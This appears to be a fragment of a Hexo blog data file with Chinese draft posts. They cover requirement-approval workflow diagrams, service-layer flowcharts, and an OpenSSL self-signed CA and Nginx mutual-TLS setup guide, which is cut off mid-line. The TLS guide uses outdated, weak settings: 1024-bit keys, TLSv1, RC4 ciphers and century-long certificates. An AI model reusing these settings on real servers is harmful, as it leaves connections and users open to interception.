class=\"line\">硬件人员实现--完成--&gt;测试人员内部验证</span><br><span class=\"line\">测试人员内部验证--通过--&gt;提单人外部验证</span><br><span class=\"line\">硬件人员实现--完成直接外部验证--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-硬件负责人--不通过--&gt;提单人</span><br><span class=\"line\">测试人员内部验证--不通过--&gt;硬件人员实现</span><br><span class=\"line\">提单人外部验证--不通过--&gt;硬件人员实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"工业设计需求流程\"><a href=\"#工业设计需求流程\" class=\"headerlink\" title=\"工业设计需求流程\"></a>工业设计需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-工业设计负责人</span><br><span class=\"line\">研发审批-工业设计负责人--通过--&gt;工业设计人员实现</span><br><span class=\"line\">工业设计人员实现--完成--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-工业设计负责人--不通过--&gt;提单人</span><br><span class=\"line\">提单人外部验证--不通过--&gt;工业设计人员实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"UI设计需求流程\"><a href=\"#UI设计需求流程\" class=\"headerlink\" title=\"UI设计需求流程\"></a>UI设计需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-UI设计组长</span><br><span class=\"line\">研发审批-UI设计组长--通过--&gt;UI设计人员实现</span><br><span class=\"line\">UI设计人员实现--完成--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-UI设计组长--不通过--&gt;提单人</span><br><span class=\"line\">提单人外部验证--不通过--&gt;UI设计人员实现</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"软件需求流程\"><a href=\"#软件需求流程\" class=\"headerlink\" title=\"软件需求流程\"></a>软件需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-软件负责人</span><br><span class=\"line\">研发审批-软件负责人--通过--&gt;软件人员实现</span><br><span class=\"line\">软件人员实现--完成--&gt;测试人员内部验证</span><br><span class=\"line\">测试人员内部验证--通过--&gt;提单人外部验证</span><br><span class=\"line\">软件人员实现--完成直接外部验证--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-软件负责人--不通过--&gt;提单人</span><br><span class=\"line\">测试人员内部验证--不通过--&gt;软件人员实现</span><br><span class=\"line\">提单人外部验证--不通过--&gt;软件人员实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"硬件需求流程\"><a href=\"#硬件需求流程\" class=\"headerlink\" title=\"硬件需求流程\"></a>硬件需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-硬件负责人</span><br><span class=\"line\">研发审批-硬件负责人--通过--&gt;硬件人员实现</span><br><span class=\"line\">硬件人员实现--完成--&gt;测试人员内部验证</span><br><span class=\"line\">测试人员内部验证--通过--&gt;提单人外部验证</span><br><span class=\"line\">硬件人员实现--完成直接外部验证--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-硬件负责人--不通过--&gt;提单人</span><br><span class=\"line\">测试人员内部验证--不通过--&gt;硬件人员实现</span><br><span class=\"line\">提单人外部验证--不通过--&gt;硬件人员实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"工业设计需求流程\"><a href=\"#工业设计需求流程\" class=\"headerlink\" title=\"工业设计需求流程\"></a>工业设计需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-工业设计负责人</span><br><span class=\"line\">研发审批-工业设计负责人--通过--&gt;工业设计人员实现</span><br><span class=\"line\">工业设计人员实现--完成--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-工业设计负责人--不通过--&gt;提单人</span><br><span class=\"line\">提单人外部验证--不通过--&gt;工业设计人员实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"UI设计需求流程\"><a href=\"#UI设计需求流程\" class=\"headerlink\" title=\"UI设计需求流程\"></a>UI设计需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-UI设计组长</span><br><span class=\"line\">研发审批-UI设计组长--通过--&gt;UI设计人员实现</span><br><span class=\"line\">UI设计人员实现--完成--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-UI设计组长--不通过--&gt;提单人</span><br><span class=\"line\">提单人外部验证--不通过--&gt;UI设计人员实现</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"用户点击确定按钮请求下一关信息时：\n\n\n\n```flow\nst=>start: 前端操作上传参数求下一关信息\nservice=>operation: service层predictNextInfo方法\nbuild=>operation: 组织需要的参数\ncalculate=>operation: 计算下一关信息方法StrategySelector.getStrategy(level).calculateNextStep\nrtn=>end: 返回结果\n\nst->service->build->calculate->rtn\n```\n\n\n\n用户提交操作\n\n```flow\nst=>start: 用户提交操作\nservice=>operation: 进入service层方法\nreal=>operation: StrategySelector.getStrategy(level).ofRealSymbol\nvalid=>operation: 权限与参数校验StrategySelector.getStrategy(level).assertRightAndDataValidate\nperform=>operation: perform执行操作\nontoNext=>operation: StrategySelector.getStrategy(level).ontoNext\nhistory=>operation: 创建历史记录RequireHistoryHandler.buildHistory\nemail=>operation: 发送邮件RequireMessageHandler.sendNoticeEmail\nrecord=>operation: 记住抄送人RequireNoticerHandler.updateCcRemember\nend=>end: 结束\n\nst->service->real->valid->perform->ontoNext->history->email->record->end\n```\n\n\n\ncalculateNextStep调用栈（描述方便略有不同）\n\n```flow\nst=>start: 进入calculateNextStep方法\nisAssignCc=>condition: 不存在前端指定抄送人\nassignCc=>operation: 获取前端指定的抄送人RequireNoticerHandler.getAssignedCcUsers\ndefCcMethod=>operation: 默认抄送人方法RequireNoticerHandler.getDefaultCcUsers\nbestRem=>condition: 没有同项目，同用户，同操作，同系统级分类记住的上次抄送人\ncomRem=>condition: 没有同项目，同用户，同操作记住的上次抄送人\nhardRem=>operation: 获取硬编码的默认抄送人StrategySelector.getStrategy(level).getDefaultCcUsers\nnextSO=>operation: 根据实际操作标识计算下一关状态和负责人\nisAssignOwner=>condition: 是否存在前端指定的负责人\nassignOwner=>operation: 使用前端指定的负责人\nend=>end: 结束calculateNextStep方法\n\nst->isAssignCc\nisAssignCc(yes)->defCcMethod->bestRem\nisAssignCc(no)->assignCc\nbestRem(yes)->comRem\ncomRem(yes)->hardRem\nassignCc->nextSO\nbestRem(no)->nextSO\ncomRem(no)->nextSO\nhardRem->nextSO\nnextSO->isAssignOwner\nisAssignOwner(yes)->assignOwner->end\nisAssignOwner(no)->end\n```\n\n","source":"_drafts/2019-06-19_md_flow.md","raw":"用户点击确定按钮请求下一关信息时：\n\n\n\n```flow\nst=>start: 前端操作上传参数求下一关信息\nservice=>operation: service层predictNextInfo方法\nbuild=>operation: 组织需要的参数\ncalculate=>operation: 计算下一关信息方法StrategySelector.getStrategy(level).calculateNextStep\nrtn=>end: 返回结果\n\nst->service->build->calculate->rtn\n```\n\n\n\n用户提交操作\n\n```flow\nst=>start: 用户提交操作\nservice=>operation: 进入service层方法\nreal=>operation: StrategySelector.getStrategy(level).ofRealSymbol\nvalid=>operation: 权限与参数校验StrategySelector.getStrategy(level).assertRightAndDataValidate\nperform=>operation: perform执行操作\nontoNext=>operation: StrategySelector.getStrategy(level).ontoNext\nhistory=>operation: 创建历史记录RequireHistoryHandler.buildHistory\nemail=>operation: 发送邮件RequireMessageHandler.sendNoticeEmail\nrecord=>operation: 记住抄送人RequireNoticerHandler.updateCcRemember\nend=>end: 结束\n\nst->service->real->valid->perform->ontoNext->history->email->record->end\n```\n\n\n\ncalculateNextStep调用栈（描述方便略有不同）\n\n```flow\nst=>start: 进入calculateNextStep方法\nisAssignCc=>condition: 不存在前端指定抄送人\nassignCc=>operation: 获取前端指定的抄送人RequireNoticerHandler.getAssignedCcUsers\ndefCcMethod=>operation: 默认抄送人方法RequireNoticerHandler.getDefaultCcUsers\nbestRem=>condition: 没有同项目，同用户，同操作，同系统级分类记住的上次抄送人\ncomRem=>condition: 没有同项目，同用户，同操作记住的上次抄送人\nhardRem=>operation: 获取硬编码的默认抄送人StrategySelector.getStrategy(level).getDefaultCcUsers\nnextSO=>operation: 根据实际操作标识计算下一关状态和负责人\nisAssignOwner=>condition: 是否存在前端指定的负责人\nassignOwner=>operation: 使用前端指定的负责人\nend=>end: 结束calculateNextStep方法\n\nst->isAssignCc\nisAssignCc(yes)->defCcMethod->bestRem\nisAssignCc(no)->assignCc\nbestRem(yes)->comRem\ncomRem(yes)->hardRem\nassignCc->nextSO\nbestRem(no)->nextSO\ncomRem(no)->nextSO\nhardRem->nextSO\nnextSO->isAssignOwner\nisAssignOwner(yes)->assignOwner->end\nisAssignOwner(no)->end\n```\n\n","slug":"2019-06-19_md_flow","published":0,"date":"2020-01-23T08:27:34.173Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0550006g0uk7jjfytz0","content":"<p>用户点击确定按钮请求下一关信息时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st=&gt;start: 前端操作上传参数求下一关信息</span><br><span class=\"line\">service=&gt;operation: service层predictNextInfo方法</span><br><span class=\"line\">build=&gt;operation: 组织需要的参数</span><br><span class=\"line\">calculate=&gt;operation: 计算下一关信息方法StrategySelector.getStrategy(level).calculateNextStep</span><br><span class=\"line\">rtn=&gt;end: 返回结果</span><br><span class=\"line\"></span><br><span class=\"line\">st-&gt;service-&gt;build-&gt;calculate-&gt;rtn</span><br></pre></td></tr></table></figure>\n\n<p>用户提交操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st=&gt;start: 用户提交操作</span><br><span class=\"line\">service=&gt;operation: 进入service层方法</span><br><span class=\"line\">real=&gt;operation: StrategySelector.getStrategy(level).ofRealSymbol</span><br><span class=\"line\">valid=&gt;operation: 权限与参数校验StrategySelector.getStrategy(level).assertRightAndDataValidate</span><br><span class=\"line\">perform=&gt;operation: perform执行操作</span><br><span class=\"line\">ontoNext=&gt;operation: StrategySelector.getStrategy(level).ontoNext</span><br><span class=\"line\">history=&gt;operation: 创建历史记录RequireHistoryHandler.buildHistory</span><br><span class=\"line\">email=&gt;operation: 发送邮件RequireMessageHandler.sendNoticeEmail</span><br><span class=\"line\">record=&gt;operation: 记住抄送人RequireNoticerHandler.updateCcRemember</span><br><span class=\"line\">end=&gt;end: 结束</span><br><span class=\"line\"></span><br><span class=\"line\">st-&gt;service-&gt;real-&gt;valid-&gt;perform-&gt;ontoNext-&gt;history-&gt;email-&gt;record-&gt;end</span><br></pre></td></tr></table></figure>\n\n<p>calculateNextStep调用栈（描述方便略有不同）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st=&gt;start: 进入calculateNextStep方法</span><br><span class=\"line\">isAssignCc=&gt;condition: 不存在前端指定抄送人</span><br><span class=\"line\">assignCc=&gt;operation: 获取前端指定的抄送人RequireNoticerHandler.getAssignedCcUsers</span><br><span class=\"line\">defCcMethod=&gt;operation: 默认抄送人方法RequireNoticerHandler.getDefaultCcUsers</span><br><span class=\"line\">bestRem=&gt;condition: 没有同项目，同用户，同操作，同系统级分类记住的上次抄送人</span><br><span class=\"line\">comRem=&gt;condition: 没有同项目，同用户，同操作记住的上次抄送人</span><br><span class=\"line\">hardRem=&gt;operation: 获取硬编码的默认抄送人StrategySelector.getStrategy(level).getDefaultCcUsers</span><br><span class=\"line\">nextSO=&gt;operation: 根据实际操作标识计算下一关状态和负责人</span><br><span class=\"line\">isAssignOwner=&gt;condition: 是否存在前端指定的负责人</span><br><span class=\"line\">assignOwner=&gt;operation: 使用前端指定的负责人</span><br><span class=\"line\">end=&gt;end: 结束calculateNextStep方法</span><br><span class=\"line\"></span><br><span class=\"line\">st-&gt;isAssignCc</span><br><span class=\"line\">isAssignCc(yes)-&gt;defCcMethod-&gt;bestRem</span><br><span class=\"line\">isAssignCc(no)-&gt;assignCc</span><br><span class=\"line\">bestRem(yes)-&gt;comRem</span><br><span class=\"line\">comRem(yes)-&gt;hardRem</span><br><span class=\"line\">assignCc-&gt;nextSO</span><br><span class=\"line\">bestRem(no)-&gt;nextSO</span><br><span class=\"line\">comRem(no)-&gt;nextSO</span><br><span class=\"line\">hardRem-&gt;nextSO</span><br><span class=\"line\">nextSO-&gt;isAssignOwner</span><br><span class=\"line\">isAssignOwner(yes)-&gt;assignOwner-&gt;end</span><br><span class=\"line\">isAssignOwner(no)-&gt;end</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>用户点击确定按钮请求下一关信息时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st=&gt;start: 前端操作上传参数求下一关信息</span><br><span class=\"line\">service=&gt;operation: service层predictNextInfo方法</span><br><span class=\"line\">build=&gt;operation: 组织需要的参数</span><br><span class=\"line\">calculate=&gt;operation: 计算下一关信息方法StrategySelector.getStrategy(level).calculateNextStep</span><br><span class=\"line\">rtn=&gt;end: 返回结果</span><br><span class=\"line\"></span><br><span class=\"line\">st-&gt;service-&gt;build-&gt;calculate-&gt;rtn</span><br></pre></td></tr></table></figure>\n\n<p>用户提交操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st=&gt;start: 用户提交操作</span><br><span class=\"line\">service=&gt;operation: 进入service层方法</span><br><span class=\"line\">real=&gt;operation: StrategySelector.getStrategy(level).ofRealSymbol</span><br><span class=\"line\">valid=&gt;operation: 权限与参数校验StrategySelector.getStrategy(level).assertRightAndDataValidate</span><br><span class=\"line\">perform=&gt;operation: perform执行操作</span><br><span class=\"line\">ontoNext=&gt;operation: StrategySelector.getStrategy(level).ontoNext</span><br><span class=\"line\">history=&gt;operation: 创建历史记录RequireHistoryHandler.buildHistory</span><br><span class=\"line\">email=&gt;operation: 发送邮件RequireMessageHandler.sendNoticeEmail</span><br><span class=\"line\">record=&gt;operation: 记住抄送人RequireNoticerHandler.updateCcRemember</span><br><span class=\"line\">end=&gt;end: 结束</span><br><span class=\"line\"></span><br><span class=\"line\">st-&gt;service-&gt;real-&gt;valid-&gt;perform-&gt;ontoNext-&gt;history-&gt;email-&gt;record-&gt;end</span><br></pre></td></tr></table></figure>\n\n<p>calculateNextStep调用栈（描述方便略有不同）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">st=&gt;start: 进入calculateNextStep方法</span><br><span class=\"line\">isAssignCc=&gt;condition: 不存在前端指定抄送人</span><br><span class=\"line\">assignCc=&gt;operation: 获取前端指定的抄送人RequireNoticerHandler.getAssignedCcUsers</span><br><span class=\"line\">defCcMethod=&gt;operation: 默认抄送人方法RequireNoticerHandler.getDefaultCcUsers</span><br><span class=\"line\">bestRem=&gt;condition: 没有同项目，同用户，同操作，同系统级分类记住的上次抄送人</span><br><span class=\"line\">comRem=&gt;condition: 没有同项目，同用户，同操作记住的上次抄送人</span><br><span class=\"line\">hardRem=&gt;operation: 获取硬编码的默认抄送人StrategySelector.getStrategy(level).getDefaultCcUsers</span><br><span class=\"line\">nextSO=&gt;operation: 根据实际操作标识计算下一关状态和负责人</span><br><span class=\"line\">isAssignOwner=&gt;condition: 是否存在前端指定的负责人</span><br><span class=\"line\">assignOwner=&gt;operation: 使用前端指定的负责人</span><br><span class=\"line\">end=&gt;end: 结束calculateNextStep方法</span><br><span class=\"line\"></span><br><span class=\"line\">st-&gt;isAssignCc</span><br><span class=\"line\">isAssignCc(yes)-&gt;defCcMethod-&gt;bestRem</span><br><span class=\"line\">isAssignCc(no)-&gt;assignCc</span><br><span class=\"line\">bestRem(yes)-&gt;comRem</span><br><span class=\"line\">comRem(yes)-&gt;hardRem</span><br><span class=\"line\">assignCc-&gt;nextSO</span><br><span class=\"line\">bestRem(no)-&gt;nextSO</span><br><span class=\"line\">comRem(no)-&gt;nextSO</span><br><span class=\"line\">hardRem-&gt;nextSO</span><br><span class=\"line\">nextSO-&gt;isAssignOwner</span><br><span class=\"line\">isAssignOwner(yes)-&gt;assignOwner-&gt;end</span><br><span class=\"line\">isAssignOwner(no)-&gt;end</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"# Openssl自签名证书及HTTPS\n\n## 步骤\n\n### 自建CA\n\nvim /etc/pki/tls/openssl.cnf确认并修改配置(这里文件地址根据具体的来，Ubuntu下这个地址就不是对的)\n\n```\ndir             = /etc/pki/CA # CA的工作目录\ndatabase        = $dir/index.txt # 签署证书的数据记录文件\nnew_certs_dir   = $dir/newcerts # 存放新签署证书的目录\nserial          = $dir/serial # 新证书签署号记录文件\ncertificate     = $dir/ca.crt # CA的证书路径\nprivate_key     = $dir/private/cakey.pem # CA的私钥路径\n```\n\n`su root`\n\n`cd /etc/pki/CA` # 切换到CA的工作目录\n\n`(umask 077; openssl genrsa -out private/cakey.pem 2048)`   # 制作CA私钥\n\n`openssl req -new -x509 -key private/cakey.pem  -out ca.crt` # 制作自签名证书\n\n`touch index.txt && touch serial && echo '01'> serial`  # 生成数据记录文件，生成签署号记录文件，给文件一个初始号。\n\n## 签名服务端证书\n\n`(umask 077; openssl genrsa -out server.key 1024)` # 制作服务器端私钥\n\n`openssl req -new -key server.key -sha512 -out server.csr`  # 制作服务器端证书申请指定使用sha512算法签名 （默认使用sha1算法）\n\n `openssl ca -in server.csr -out server.crt -days 36500`  # 签署证书\n\n## 签名客户端证书\n\n```\n# 制作客户端私钥\n(umask 077; openssl genrsa -out kehuduan.key 1024)\n\n# 制作客户端证书申请\nopenssl req -new -key kehuduan.key -out kehuduan.csr \n\n# 签署证书\nopenssl ca -in kehuduan.csr -out kehuduan.crt -days 3650\n```\n\n## 注意事项\n\n1、制作证书时会提示输入密码，设置密码可选，服务器证书和客户端证书密码可以不相同。\n\n2、服务器证书和客户端证书制作时提示输入省份、城市、域名信息等，需保持一致。\n\n3、以下信息根证书需要和客户端证书匹配，否则可能出现签署问题。\n\n```\ncountryName = match\nstateOrProvinceName = match\norganizationName = match\norganizationalUnitName = match\n```\n\n\n\n## Nginx\n\n```\nserver {\n        listen       443;\n        server_name  pro.server.com;\n        ssi on;\n        ssi_silent_errors on;\n        ssi_types text/shtml;\n\n        ssl                  on;\n        ssl_certificate      /data/server/nginx/ssl/self/server.crt;\n        ssl_certificate_key  /data/server/nginx/ssl/self/server.key;\n        ssl_client_certificate /data/server/nginx/ssl/self/ca/ca.crt;\n\n        ssl_verify_client on;\n        ssl_protocols    TLSv1 TLSv1.1 TLSv1.2;\n        ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-RC4-SHA:!ECDHE-RSA-RC4-SHA:ECDH-ECDSA-RC4-SHA:ECDH-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:!RC4-SHA:HIGH:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!CBC:!EDH:!kEDH:!PSK:!SRP:!kECDH;\n        ssl_prefer_server_ciphers On;\n\n        index index.html index.htm index.php;\n        root /data/www;\n        location ~ .*\\.(php|php5)?$\n        {\n                #fastcgi_pass  unix:/tmp/php-cgi.sock;\n                fastcgi_pass  127.0.0.1:9000;\n                fastcgi_index index.php;\n                include fastcgi.conf;\n        }\n        location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$\n        {\n                expires 30d;\n        }\n        location ~ .*\\.(js|css)?$\n        {\n                expires 1h;\n        }\n###this is to use open website lianjie like on apache##\n        location / {\n                if (!-e $request_filename) {\n                        rewrite ^(.*)$ /index.php?s=$1 last;\n                        break;\n                }\n                 keepalive_timeout  0;\n        }\n        location ~ /.svn/ {\n        deny all;\n        }\n###end##\n        include /data/server/nginx/conf/rewrite/test.conf;\n        access_log /log/nginx/access/access.log; \n}\n```\n\n\n\n\n\n## 签名算法种类\n\n通过openssl dgst -help查看\n\n## 参考\n[nginx实现https双向认证](https://blog.51cto.com/tchuairen/1782945)","source":"_drafts/openssl_selfsign.md","raw":"# Openssl自签名证书及HTTPS\n\n## 步骤\n\n### 自建CA\n\nvim /etc/pki/tls/openssl.cnf确认并修改配置(这里文件地址根据具体的来，Ubuntu下这个地址就不是对的)\n\n```\ndir             = /etc/pki/CA # CA的工作目录\ndatabase        = $dir/index.txt # 签署证书的数据记录文件\nnew_certs_dir   = $dir/newcerts # 存放新签署证书的目录\nserial          = $dir/serial # 新证书签署号记录文件\ncertificate     = $dir/ca.crt # CA的证书路径\nprivate_key     = $dir/private/cakey.pem # CA的私钥路径\n```\n\n`su root`\n\n`cd /etc/pki/CA` # 切换到CA的工作目录\n\n`(umask 077; openssl genrsa -out private/cakey.pem 2048)`   # 制作CA私钥\n\n`openssl req -new -x509 -key private/cakey.pem  -out ca.crt` # 制作自签名证书\n\n`touch index.txt && touch serial && echo '01'> serial`  # 生成数据记录文件，生成签署号记录文件，给文件一个初始号。\n\n## 签名服务端证书\n\n`(umask 077; openssl genrsa -out server.key 1024)` # 制作服务器端私钥\n\n`openssl req -new -key server.key -sha512 -out server.csr`  # 制作服务器端证书申请指定使用sha512算法签名 （默认使用sha1算法）\n\n `openssl ca -in server.csr -out server.crt -days 36500`  # 签署证书\n\n## 签名客户端证书\n\n```\n# 制作客户端私钥\n(umask 077; openssl genrsa -out kehuduan.key 1024)\n\n# 制作客户端证书申请\nopenssl req -new -key kehuduan.key -out kehuduan.csr \n\n# 签署证书\nopenssl ca -in kehuduan.csr -out kehuduan.crt -days 3650\n```\n\n## 注意事项\n\n1、制作证书时会提示输入密码，设置密码可选，服务器证书和客户端证书密码可以不相同。\n\n2、服务器证书和客户端证书制作时提示输入省份、城市、域名信息等，需保持一致。\n\n3、以下信息根证书需要和客户端证书匹配，否则可能出现签署问题。\n\n```\ncountryName = match\nstateOrProvinceName = match\norganizationName = match\norganizationalUnitName = match\n```\n\n\n\n## Nginx\n\n```\nserver {\n        listen       443;\n        server_name  pro.server.com;\n        ssi on;\n        ssi_silent_errors on;\n        ssi_types text/shtml;\n\n        ssl                  on;\n        ssl_certificate      